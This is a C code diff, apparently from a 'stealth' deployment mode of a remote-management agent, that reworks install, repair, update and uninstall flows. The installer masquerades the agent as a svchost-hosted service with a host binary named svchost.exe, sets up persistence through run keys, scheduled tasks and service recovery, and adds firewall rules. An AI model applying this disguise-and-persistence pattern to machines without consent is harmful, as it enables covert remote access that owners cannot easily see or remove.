+            Stealth_LogInstallEvent(L"[UPDATE] Failed to restore host executable DACL during rollback (%ls)", paths->exePath);
+            ok = FALSE;
+        }
+    }
+
+    if (ok)
+    {
+        ok = Stealth_RegisterSvchostService(serviceKeyName, paths->dllPath);
+    }
+    if (ok)
+    {
+        ok = Stealth_VerifySvchostServiceBinding(serviceKeyName, paths->dllPath);
+    }
+    if (ok)
+    {
+        Stealth_RecordServiceDllHash(serviceKeyName, paths->dllPath);
+    }
+
+    return ok;
+}
+
+static BOOL Stealth_WaitForExpectedIdentity(const wchar_t* dbPath, const StealthIdentitySnapshot* expectedIdentity, DWORD timeoutMs)
+{
+    if (expectedIdentity == NULL) { return TRUE; }
+    if (!expectedIdentity->nodeIdPresent &&
+        !expectedIdentity->meshIdPresent &&
+        !expectedIdentity->serverIdPresent &&
+        !expectedIdentity->meshServerPresent)
+    {
+        return TRUE;
+    }
+
+    DWORD waited = 0;
+    while (waited <= timeoutMs)
+    {
+        StealthIdentitySnapshot currentIdentity;
+        ZeroMemory(&currentIdentity, sizeof(currentIdentity));
+        if (Stealth_CaptureIdentitySnapshot(dbPath, &currentIdentity) &&
+            Stealth_IdentitySnapshotMatches(expectedIdentity, &currentIdentity))
+        {
+            return TRUE;
+        }
+
+        Sleep(500);
+        waited += 500;
+    }
+
+    StealthIdentitySnapshot finalIdentity;
+    ZeroMemory(&finalIdentity, sizeof(finalIdentity));
+    if (Stealth_CaptureIdentitySnapshot(dbPath, &finalIdentity))
+    {
+        Stealth_LogIdentitySnapshot(L"mismatch", &finalIdentity);
+    }
+    return FALSE;
+}
+
+static BOOL Stealth_ClearPendingUpdateArtifacts(const StealthInstallPaths* paths, const wchar_t* phaseLabel)
+{
+    BOOL ok = TRUE;
+    wchar_t stateDir[MAX_PATH] = {0};
+    wchar_t stageDir[MAX_PATH] = {0};
+    wchar_t backupDir[MAX_PATH] = {0};
+    const wchar_t* safePhase = (phaseLabel != NULL && phaseLabel[0] != L'\0') ? phaseLabel : L"[REPAIR]";
+
+    if (paths == NULL) { return FALSE; }
+
+    if (MeshInstaller_CombinePath(stateDir, _countof(stateDir), paths->installDir, L"state"))
+    {
+        if (MeshInstaller_CombinePath(stageDir, _countof(stageDir), stateDir, STEALTH_UPDATE_STAGE_DIR_NAME) &&
+            Stealth_PathExists(stageDir) &&
+            !Stealth_RemoveDirectoryTree(stageDir, TRUE))
+        {
+            Stealth_LogInstallEvent(L"%ls Failed to remove stale update-stage directory (%ls)", safePhase, stageDir);
+            ok = FALSE;
+        }
+        if (MeshInstaller_CombinePath(backupDir, _countof(backupDir), stateDir, STEALTH_UPDATE_BACKUP_DIR_NAME) &&
+            Stealth_PathExists(backupDir) &&
+            !Stealth_RemoveDirectoryTree(backupDir, TRUE))
+        {
+            Stealth_LogInstallEvent(L"%ls Failed to remove stale update-backup directory (%ls)", safePhase, backupDir);
+            ok = FALSE;
+        }
+    }
+
+    if (paths->dbPath[0] != L'\0' && Stealth_DataStoreValueExists(paths->dbPath, "PendingUpdate", NULL, 0, NULL))
+    {
+        if (!Stealth_DataStoreDeleteValue(paths->dbPath, "PendingUpdate"))
+        {
+            Stealth_LogInstallEvent(L"%ls Failed to clear PendingUpdate marker from datastore", safePhase);
+            ok = FALSE;
+        }
+        else
+        {
+            Stealth_LogInstallEvent(L"%ls Cleared stale PendingUpdate marker from datastore", safePhase);
+        }
+    }
+
+    return ok;
+}
+
 // ================================================================
 // Complete Installation Function
 // ================================================================
 
-BOOL Stealth_PerformCompleteInstallation(
+static BOOL Stealth_ApplyInstallFlow(
     const wchar_t* sourceExePath,
     const wchar_t* sourceDllPath,
     BOOL useSvchostMode)
@@ -1591,10 +2940,11 @@ BOOL Stealth_PerformCompleteInstallation(
     UNREFERENCED_PARAMETER(useSvchostMode);
     StealthInstallPaths paths;
     BOOL success = FALSE;
-    BOOL dllStaged = FALSE;
     wchar_t serviceKeyName[256] = {0};
     wchar_t serviceDisplayName[256] = {0};
     wchar_t serviceDescription[512] = {0};
+    StealthPackagePreflight preflight;
+    wchar_t preflightReason[512] = {0};
     const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
     if (persistence)
     {
@@ -1609,14 +2959,13 @@ BOOL Stealth_PerformCompleteInstallation(
         Stealth_LogInstallEvent(L"Persistence profile missing; RunKey/Task disabled");
     }
 
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
-    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
-
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
-    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
-
-    MeshService_CopyBrandingTextToWide(MeshConfig_GetBranding()->fileDescription, serviceDescription, _countof(serviceDescription));
-    if (serviceDescription[0] == L'\0') { StringCchCopyW(serviceDescription, _countof(serviceDescription), STEALTH_FALLBACK_SERVICE_DESCRIPTION); }
+    Stealth_ResolveRuntimeServiceBranding(
+        serviceKeyName,
+        _countof(serviceKeyName),
+        serviceDisplayName,
+        _countof(serviceDisplayName),
+        serviceDescription,
+        _countof(serviceDescription));
 
     Stealth_CleanupLegacyServiceAlias(serviceKeyName);
 
@@ -1628,6 +2977,60 @@ BOOL Stealth_PerformCompleteInstallation(
         return FALSE;
     }
     Stealth_LogInstallEvent(L"Install paths resolved (root=%ls)", paths.installDir);
+    {
+        size_t removedAliases = Stealth_CleanupConflictingServiceAliases(&paths, serviceKeyName);
+        if (removedAliases > 0)
+        {
+            Stealth_LogInstallEvent(L"[ALIAS] Removed %Iu conflicting service alias(es) before install", removedAliases);
+        }
+    }
+
+    ZeroMemory(&preflight, sizeof(preflight));
+    if (!Stealth_PreflightPackageSource(sourceExePath, FALSE, TRUE, &preflight, preflightReason, _countof(preflightReason)))
+    {
+        Stealth_LogInstallEvent(L"[INSTALL] Package preflight failed: %ls", preflightReason);
+        return FALSE;
+    }
+    Stealth_LogInstallEvent(
+        L"[INSTALL] Package preflight passed (msh=%u conf=%u embedded=%u db=%u)",
+        preflight.sourceMshValid,
+        preflight.sourceConfValid,
+        preflight.sourceEmbeddedConfigPresent,
+        preflight.sourceDbPresent);
+    if (sourceDllPath != NULL && sourceDllPath[0] != L'\0' && !Stealth_ValidateSvchostPayloadDll(sourceDllPath))
+    {
+        Stealth_LogInstallEvent(L"[INSTALL] Package preflight failed: invalid svchost DLL source (%ls)", sourceDllPath);
+        return FALSE;
+    }
+
+    Stealth_ImportWinHttpProxyFromIeBestEffort();
+
+    // Pre-clean: stop any running service and remove stale artifacts from prior failed installs
+    Stealth_StopServiceAndWait(serviceKeyName, 20000, TRUE);
+    {
+        wchar_t staleHostExe[MAX_PATH] = {0};
+        if (MeshInstaller_CombinePath(staleHostExe, _countof(staleHostExe), paths.installDir, L"svchost.exe"))
+        {
+            Stealth_TerminateProcessesByPath(staleHostExe);
+        }
+        Stealth_TerminateProcessesByPath(paths.exePath);
+    }
+    {
+        wchar_t staleStateDir[MAX_PATH] = {0};
+        wchar_t staleStageDir[MAX_PATH] = {0};
+        wchar_t staleBackupDir[MAX_PATH] = {0};
+        if (MeshInstaller_CombinePath(staleStateDir, _countof(staleStateDir), paths.installDir, L"state"))
+        {
+            if (MeshInstaller_CombinePath(staleStageDir, _countof(staleStageDir), staleStateDir, STEALTH_UPDATE_STAGE_DIR_NAME))
+            {
+                Stealth_RemoveDirectoryTree(staleStageDir, FALSE);
+            }
+            if (MeshInstaller_CombinePath(staleBackupDir, _countof(staleBackupDir), staleStateDir, STEALTH_UPDATE_BACKUP_DIR_NAME))
+            {
+                Stealth_RemoveDirectoryTree(staleBackupDir, FALSE);
+            }
+        }
+    }
 
     // Step 1: Create installation directories
     if (!Stealth_CreateInstallRootDirectory(paths.installDir))
@@ -1667,14 +3070,12 @@ BOOL Stealth_PerformCompleteInstallation(
 
     if (sourceExePath && sourceExePath[0] != L'\0')
     {
-        if (Stealth_EnsureConfigFile(sourceExePath, paths.confPath))
+        if (!Stealth_EnsureConfigFile(sourceExePath, paths.confPath))
         {
-            Stealth_LogInstallEvent(L"Provisioning config staged to %ls", paths.confPath);
+            Stealth_LogInstallEvent(L"Failed to stage required provisioning config to %ls", paths.confPath);
+            return FALSE;
         }
-        else
-        {
-            Stealth_LogInstallEvent(L"[WARN] Unable to stage provisioning config to %ls", paths.confPath);
-        }
+        Stealth_LogInstallEvent(L"Provisioning config staged to %ls", paths.confPath);
     }
 
     if (paths.exePath[0] != L'\0')
@@ -1691,14 +3092,12 @@ BOOL Stealth_PerformCompleteInstallation(
             StringCchCatW(mshPath, _countof(mshPath), L".msh");
         }
 
-        if (Stealth_EnsureMshFile(sourceExePath, mshPath, paths.confPath))
+        if (!Stealth_EnsureMshFile(sourceExePath, mshPath, paths.confPath))
         {
-            Stealth_LogInstallEvent(L"Provisioning msh staged to %ls", mshPath);
+            Stealth_LogInstallEvent(L"Failed to stage required provisioning msh to %ls", mshPath);
+            return FALSE;
         }
-        else
-        {
-            Stealth_LogInstallEvent(L"[WARN] Unable to stage provisioning msh to %ls", mshPath);
-        }
+        Stealth_LogInstallEvent(L"Provisioning msh staged to %ls", mshPath);
 
         if (Stealth_ShouldEnableDebugConsole())
         {
@@ -1709,52 +3108,13 @@ BOOL Stealth_PerformCompleteInstallation(
 
     // Always stage the svchost DLL payload
     Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
-    if (sourceDllPath && sourceDllPath[0] != L'\0')
+    if (!Stealth_EnsureSvchostDllFile(sourceExePath, sourceDllPath, paths.dllPath))
     {
-        dllStaged = Stealth_InstallFiles(sourceDllPath, paths.dllPath);
-        if (!dllStaged)
-        {
-            Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (DLL) %ls -> %ls", sourceDllPath, paths.dllPath);
-            Stealth_LogInstallEvent(L"Failed to stage svchost DLL to %ls", paths.dllPath);
-        }
-    }
-    else
-    {
-        dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
-        if (!dllStaged)
-        {
-            Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
-            Stealth_LogInstallEvent(L"Failed to emit embedded svchost DLL to %ls (error=%lu)", paths.dllPath, GetLastError());
-            Stealth_LogPathState(paths.dllPath);
-            Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
-        }
-    }
-
-    if (!dllStaged)
-    {
+        Stealth_LogInstallEvent(L"Failed to stage a valid svchost DLL to %ls", paths.dllPath);
+        Stealth_LogPathState(paths.dllPath);
         return FALSE;
     }
     Stealth_LogInstallEvent(L"Svchost payload staged to %ls", paths.dllPath);
-
-    if (!Stealth_ValidateSvchostPayloadDll(paths.dllPath))
-    {
-        if (sourceDllPath && sourceDllPath[0] != L'\0')
-        {
-            Stealth_LogInstallEvent(L"Provided svchost DLL failed validation; attempting embedded payload fallback");
-            Stealth_RemoveFileIfExists(paths.dllPath, TRUE);
-            dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
-            if (!dllStaged || !Stealth_ValidateSvchostPayloadDll(paths.dllPath))
-            {
-                Stealth_LogInstallEvent(L"Embedded svchost DLL fallback validation failed for %ls", paths.dllPath);
-                return FALSE;
-            }
-            Stealth_LogInstallEvent(L"Embedded svchost payload fallback staged to %ls", paths.dllPath);
-        }
-        else
-        {
-            return FALSE;
-        }
-    }
 
     // Register svchost-hosted service only
     if (!Stealth_RegisterSvchostService(serviceKeyName, paths.dllPath))
@@ -1770,6 +3130,7 @@ BOOL Stealth_PerformCompleteInstallation(
         return FALSE;
     }
     Stealth_RecordServiceDllHash(serviceKeyName, paths.dllPath);
+    Stealth_RemoveInactiveSvchostPayloadDlls(&paths);
     Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
     Stealth_ApplyPersistenceProfile();
     success = TRUE;
@@ -1829,11 +3190,62 @@ BOOL Stealth_PerformCompleteInstallation(
     return success;
 }
 
+static BOOL Stealth_ApplyRepairFlow(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode)
+{
+    StealthInstallPaths paths;
+    StealthLifecycleDiscovery finalState;
+
+    if (!Stealth_ApplyInstallFlow(sourceExePath, sourceDllPath, useSvchostMode))
+    {
+        return FALSE;
+    }
+
+    if (!Stealth_GetInstallPaths(&paths))
+    {
+        Stealth_LogInstallEvent(L"[REPAIR] Failed to resolve install paths after repair install");
+        return FALSE;
+    }
+
+    if (!Stealth_ClearPendingUpdateArtifacts(&paths, L"[REPAIR]"))
+    {
+        return FALSE;
+    }
+
+    if (!Stealth_WaitForPrimaryLifecycleHealthy(30000, &finalState))
+    {
+        Stealth_LogInstallEvent(
+            L"[REPAIR] Post-repair discovery did not converge to healthy state (state=%ls pending=%u stageArtifacts=%u backupArtifacts=%u firewall=%u persistence=%u)",
+            Stealth_LifecycleStateToString(finalState.stateKind),
+            finalState.pendingUpdate,
+            finalState.updateStageArtifactsPresent,
+            finalState.updateBackupArtifactsPresent,
+            finalState.firewallHealthy,
+            finalState.persistenceHealthy);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+static const wchar_t* MeshInstaller_GetPathLeaf(const wchar_t* path)
+{
+    const wchar_t* leaf = NULL;
+    if (path == NULL || path[0] == L'\0') { return NULL; }
+
+    leaf = wcsrchr(path, L'\\');
+    if (leaf == NULL)
+    {
+        leaf = wcsrchr(path, L'/');
+    }
+
+    return (leaf != NULL && leaf[1] != L'\0') ? (leaf + 1) : path;
+}
+
 // ================================================================
 // Uninstallation
 // ================================================================
 
-BOOL Stealth_PerformCompleteUninstallation(void)
+static BOOL Stealth_ApplyUninstallFlow(void)
 {
     StealthInstallPaths paths;
     wchar_t serviceKeyName[256] = {0};
@@ -1846,12 +3258,14 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     wchar_t controlLogPath[MAX_PATH] = {0};
     wchar_t svchostDebugPath[MAX_PATH] = {0};
     wchar_t hostExePath[MAX_PATH] = {0};
-    wchar_t masterServicePath[MAX_PATH] = {0};
 
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
-    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
-    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
+    Stealth_ResolveRuntimeServiceBranding(
+        serviceKeyName,
+        _countof(serviceKeyName),
+        serviceDisplayName,
+        _countof(serviceDisplayName),
+        NULL,
+        0);
 
     Stealth_CleanupLegacyServiceAlias(serviceKeyName);
 
@@ -1861,7 +3275,13 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     // Get paths
     Stealth_GetInstallPaths(&paths);
     MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe");
-    MeshInstaller_CombinePath(masterServicePath, _countof(masterServicePath), paths.installDir, STEALTH_MASTER_SERVICE_EXE_NAME);
+    {
+        size_t removedAliases = Stealth_CleanupConflictingServiceAliases(&paths, serviceKeyName);
+        if (removedAliases > 0)
+        {
+            Stealth_LogInstallEvent(L"[ALIAS] Removed %Iu conflicting service alias(es) before uninstall", removedAliases);
+        }
+    }
 
     // Disable recovery and remove restart triggers before stopping
     Stealth_ClearServiceRecovery(serviceKeyName);
@@ -1872,18 +3292,21 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE);
     Stealth_TerminateProcessesByPath(hostExePath);
     Stealth_TerminateProcessesByPath(paths.exePath);
-    Stealth_TerminateProcessesByPath(masterServicePath);
 
     // Clean up any persistence artifacts that may have been recreated during shutdown
     Stealth_RemoveScheduledTasks(persistence, serviceDisplayName, serviceKeyName);
     Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE);
     Stealth_TerminateProcessesByPath(hostExePath);
     Stealth_TerminateProcessesByPath(paths.exePath);
-    Stealth_TerminateProcessesByPath(masterServicePath);
 
     if (!Stealth_UnregisterSvchostService(serviceKeyName))
     {
         Stealth_LogInstallEvent(L"[WARN] Failed to unregister service %ls", serviceKeyName);
+        success = FALSE;
+    }
+    else if (!Stealth_WaitForServiceAbsence(serviceKeyName, 30000))
+    {
+        Stealth_LogInstallEvent(L"[WARN] Service removal did not converge within timeout for %ls", serviceKeyName);
         success = FALSE;
     }
 
@@ -1891,6 +3314,11 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     if (!Stealth_RemoveFirewallRuleForService(serviceKeyName))
     {
         Stealth_LogInstallEvent(L"[WARN] Failed to remove firewall rules for %ls", serviceKeyName);
+        success = FALSE;
+    }
+    if (!Stealth_DeleteServiceStateRegistryTree(serviceKeyName))
+    {
+        Stealth_LogInstallEvent(L"[WARN] Failed to remove service state registry tree for %ls", serviceKeyName);
         success = FALSE;
     }
     if (!Stealth_RemoveFirewallRulesByExePath(paths.exePath))
@@ -1905,7 +3333,6 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     if (!Stealth_RemoveFileIfExists(paths.confPath, TRUE)) { success = FALSE; }
     if (!Stealth_RemoveFileIfExists(paths.exePath, TRUE)) { success = FALSE; }
     if (!Stealth_RemoveFileIfExists(paths.dllPath, TRUE)) { success = FALSE; }
-    if (!Stealth_RemoveFileIfExistsWithTimeout(masterServicePath, 20000, TRUE)) { success = FALSE; }
 
     MeshInstaller_CombinePath(svchostPath, _countof(svchostPath), paths.installDir, L"svchost.exe");
     MeshInstaller_CombinePath(stateDatPath, _countof(stateDatPath), paths.installDir, L"state.dat");
@@ -1949,7 +3376,7 @@ BOOL Stealth_PerformCompleteUninstallation(void)
 // Update (in-place repair/update without full uninstall)
 // ================================================================
 
-BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode)
+static BOOL Stealth_ApplyUpdateFlow(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode)
 {
     if (!useSvchostMode)
     {
@@ -1958,17 +3385,25 @@ BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDl
     }
 
     StealthInstallPaths paths;
-    BOOL dllStaged = FALSE;
     BOOL success = TRUE;
-    BOOL restartService = FALSE;
+    BOOL restartService = TRUE;
+    BOOL serviceExists = FALSE;
     wchar_t serviceKeyName[256] = {0};
     wchar_t serviceDisplayName[256] = {0};
+    wchar_t hostExePath[MAX_PATH] = {0};
+    StealthUpdateTransaction tx;
+    StealthPackagePreflight preflight;
+    wchar_t preflightReason[512] = {0};
+    ZeroMemory(&tx, sizeof(tx));
     const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
 
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
-    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
-    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
+    Stealth_ResolveRuntimeServiceBranding(
+        serviceKeyName,
+        _countof(serviceKeyName),
+        serviceDisplayName,
+        _countof(serviceDisplayName),
+        NULL,
+        0);
 
     Stealth_CleanupLegacyServiceAlias(serviceKeyName);
 
@@ -1979,20 +3414,78 @@ BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDl
         Stealth_LogInstallEvent(L"[UPDATE] Failed to resolve install paths");
         return FALSE;
     }
+    (void)MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe");
+    {
+        size_t removedAliases = Stealth_CleanupConflictingServiceAliases(&paths, serviceKeyName);
+        if (removedAliases > 0)
+        {
+            Stealth_LogInstallEvent(L"[ALIAS] Removed %Iu conflicting service alias(es) before update", removedAliases);
+        }
+    }
+    serviceExists = Stealth_IsAlreadyInstalled();
+
+    ZeroMemory(&preflight, sizeof(preflight));
+    if (!Stealth_PreflightPackageSource(sourceExePath, TRUE, TRUE, &preflight, preflightReason, _countof(preflightReason)))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Package preflight failed: %ls", preflightReason);
+        return FALSE;
+    }
+    Stealth_LogInstallEvent(
+        L"[UPDATE] Package preflight passed (msh=%u conf=%u embedded=%u existingFallback=%u db=%u)",
+        preflight.sourceMshValid,
+        preflight.sourceConfValid,
+        preflight.sourceEmbeddedConfigPresent,
+        preflight.configFromExistingInstall,
+        preflight.sourceDbPresent);
+    if (sourceDllPath != NULL && sourceDllPath[0] != L'\0' && !Stealth_ValidateSvchostPayloadDll(sourceDllPath))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Package preflight failed: invalid svchost DLL source (%ls)", sourceDllPath);
+        return FALSE;
+    }
+
+    Stealth_ImportWinHttpProxyFromIeBestEffort();
 
     Stealth_CreateInstallRootDirectory(paths.installDir);
     Stealth_CreateInstallationDirectory(paths.logsDir);
+
+    // Pre-clean stale staging/backup artifacts from prior failed updates
+    {
+        wchar_t staleStateDir[MAX_PATH] = {0};
+        wchar_t staleStageDir[MAX_PATH] = {0};
+        wchar_t staleBackupDir[MAX_PATH] = {0};
+        if (MeshInstaller_CombinePath(staleStateDir, _countof(staleStateDir), paths.installDir, L"state"))
+        {
+            if (MeshInstaller_CombinePath(staleStageDir, _countof(staleStageDir), staleStateDir, STEALTH_UPDATE_STAGE_DIR_NAME))
+            {
+                Stealth_RemoveDirectoryTree(staleStageDir, FALSE);
+            }
+            if (MeshInstaller_CombinePath(staleBackupDir, _countof(staleBackupDir), staleStateDir, STEALTH_UPDATE_BACKUP_DIR_NAME))
+            {
+                Stealth_RemoveDirectoryTree(staleBackupDir, FALSE);
+            }
+        }
+    }
+
+    if (!Stealth_PrepareUpdateTransaction(&paths, sourceExePath, sourceDllPath, &tx))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to prepare staged update transaction");
+        return FALSE;
+    }
 
     // Disable restart mechanisms before stopping to avoid immediate re-launch.
     StealthPersistenceState persisted = {0};
     BOOL havePersisted = Stealth_LoadPersistenceState(&persisted);
 
     DWORD originalStartType = SERVICE_AUTO_START;
-    (void)Stealth_QueryServiceStartType(serviceKeyName, &originalStartType);
-    BOOL disabledStartType = Stealth_SetServiceStartType(serviceKeyName, SERVICE_DISABLED);
-    if (!disabledStartType)
+    BOOL disabledStartType = FALSE;
+    if (serviceExists)
     {
-        Stealth_LogInstallEvent(L"[WARN] [UPDATE] Failed to disable service start type (%ls, error=%lu)", serviceKeyName, GetLastError());
+        (void)Stealth_QueryServiceStartType(serviceKeyName, &originalStartType);
+        disabledStartType = Stealth_SetServiceStartType(serviceKeyName, SERVICE_DISABLED);
+        if (!disabledStartType)
+        {
+            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Failed to disable service start type (%ls, error=%lu)", serviceKeyName, GetLastError());
+        }
     }
 
     Stealth_ClearServiceRecovery(serviceKeyName);
@@ -2010,128 +3503,73 @@ BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDl
         }
     }
 
-    if (!Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE))
+    if (serviceExists && !Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE))
     {
-        Stealth_LogInstallEvent(L"[UPDATE] Service did not stop; aborting update");
-        success = FALSE;
-        goto CLEANUP;
+        Stealth_LogInstallEvent(L"[WARN] [UPDATE] Service stop timed out; forcing dedicated host teardown");
+        if (hostExePath[0] != L'\0')
+        {
+            Stealth_TerminateProcessesByPath(hostExePath);
+        }
+        Stealth_TerminateProcessesByPath(paths.exePath);
+        Sleep(1000);
+        if (Stealth_ServiceIsRunning(serviceKeyName))
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Service still running after forced teardown; aborting update");
+            success = FALSE;
+            goto CLEANUP;
+        }
     }
-    restartService = TRUE;
+    if (!serviceExists)
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Existing service registration absent; continuing with repair install semantics");
+    }
 
-    wchar_t hostExePath[MAX_PATH] = {0};
     if (MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe"))
     {
         Stealth_TerminateProcessesByPath(hostExePath);
     }
     Stealth_TerminateProcessesByPath(paths.exePath);
 
-    if (sourceExePath && sourceExePath[0] != L'\0')
+    // Wait for file locks to release after process termination (DLL may still be held briefly)
+    if (paths.dllPath[0] != L'\0' && GetFileAttributesW(paths.dllPath) != INVALID_FILE_ATTRIBUTES)
     {
-        if (!Stealth_InstallFiles(sourceExePath, paths.exePath))
+        DWORD lockWaitStart = GetTickCount();
+        while ((GetTickCount() - lockWaitStart) < 10000)
         {
-            Stealth_LogInstallEvent(L"[UPDATE] Failed to copy executable to %ls", paths.exePath);
-            success = FALSE;
-            goto CLEANUP;
+            HANDLE hTest = CreateFileW(paths.dllPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hTest != INVALID_HANDLE_VALUE)
+            {
+                CloseHandle(hTest);
+                break;
+            }
+            DWORD lockErr = GetLastError();
+            if (lockErr != ERROR_SHARING_VIOLATION && lockErr != ERROR_LOCK_VIOLATION) { break; }
+            Sleep(250);
         }
     }
 
-    if (paths.exePath[0] != L'\0' && GetFileAttributesW(paths.exePath) != INVALID_FILE_ATTRIBUTES)
+    if (!Stealth_BackupUpdateTransaction(&paths, &tx))
     {
-        if (!Stealth_HardenHostExecutableDacl(paths.exePath))
-        {
-            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Failed to apply host executable DACL to %ls", paths.exePath);
-            success = FALSE;
-            goto CLEANUP;
-        }
-    }
-
-    if (sourceExePath && sourceExePath[0] != L'\0')
-    {
-        if (Stealth_EnsureConfigFile(sourceExePath, paths.confPath))
-        {
-            Stealth_LogInstallEvent(L"[UPDATE] Provisioning config staged to %ls", paths.confPath);
-        }
-        else
-        {
-            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Unable to stage provisioning config to %ls", paths.confPath);
-        }
-    }
-
-    if (paths.exePath[0] != L'\0')
-    {
-        wchar_t mshPath[MAX_PATH] = {0};
-        StringCchCopyW(mshPath, _countof(mshPath), paths.exePath);
-        wchar_t* dot = wcsrchr(mshPath, L'.');
-        if (dot != NULL)
-        {
-            StringCchCopyW(dot, _countof(mshPath) - (dot - mshPath), L".msh");
-        }
-        else
-        {
-            StringCchCatW(mshPath, _countof(mshPath), L".msh");
-        }
-
-        if (Stealth_EnsureMshFile(sourceExePath, mshPath, paths.confPath))
-        {
-            Stealth_LogInstallEvent(L"[UPDATE] Provisioning msh staged to %ls", mshPath);
-        }
-        else
-        {
-            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Unable to stage provisioning msh to %ls", mshPath);
-        }
-
-        if (Stealth_ShouldEnableDebugConsole())
-        {
-            Stealth_AppendConfigOverride(paths.confPath, "debugConsole", "1");
-            Stealth_AppendConfigOverride(mshPath, "debugConsole", "1");
-        }
-    }
-
-    if (!Stealth_RemoveFileIfExistsWithTimeout(paths.dllPath, 60000, TRUE))
-    {
-        Stealth_LogInstallEvent(L"[UPDATE] Failed to remove existing svchost DLL (%ls)", paths.dllPath);
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to capture quiesced rollback set");
         success = FALSE;
         goto CLEANUP;
     }
-    if (sourceDllPath && sourceDllPath[0] != L'\0')
+    if (tx.liveDbExists)
     {
-        dllStaged = Stealth_InstallFiles(sourceDllPath, paths.dllPath);
-    }
-    else
-    {
-        dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
-    }
-
-    if (!dllStaged)
-    {
-        Stealth_LogInstallEvent(L"[UPDATE] Failed to stage svchost DLL to %ls", paths.dllPath);
-        success = FALSE;
-        goto CLEANUP;
-    }
-    if (!Stealth_ValidateSvchostPayloadDll(paths.dllPath))
-    {
-        if (sourceDllPath && sourceDllPath[0] != L'\0')
+        if (!Stealth_DataStorePutValue(paths.dbPath, "PendingUpdate", "1", 1))
         {
-            Stealth_LogInstallEvent(L"[UPDATE] Provided svchost DLL failed validation; attempting embedded payload fallback");
-            if (!Stealth_RemoveFileIfExistsWithTimeout(paths.dllPath, 60000, TRUE))
-            {
-                Stealth_LogInstallEvent(L"[UPDATE] Failed to remove invalid svchost DLL during fallback (%ls)", paths.dllPath);
-                success = FALSE;
-                goto CLEANUP;
-            }
-            if (!MeshSvchostPayload_WriteToPath(paths.dllPath) || !Stealth_ValidateSvchostPayloadDll(paths.dllPath))
-            {
-                Stealth_LogInstallEvent(L"[UPDATE] Embedded svchost DLL fallback validation failed for %ls", paths.dllPath);
-                success = FALSE;
-                goto CLEANUP;
-            }
-            Stealth_LogInstallEvent(L"[UPDATE] Embedded svchost payload fallback staged to %ls", paths.dllPath);
-        }
-        else
-        {
+            Stealth_LogInstallEvent(L"[UPDATE] Failed to mark PendingUpdate before commit");
             success = FALSE;
             goto CLEANUP;
         }
+        tx.pendingUpdateMarked = TRUE;
+        Stealth_LogInstallEvent(L"[UPDATE] PendingUpdate marker written prior to commit");
+    }
+
+    if (!Stealth_CommitUpdateTransaction(&paths, &tx))
+    {
+        success = FALSE;
+        goto CLEANUP;
     }
 
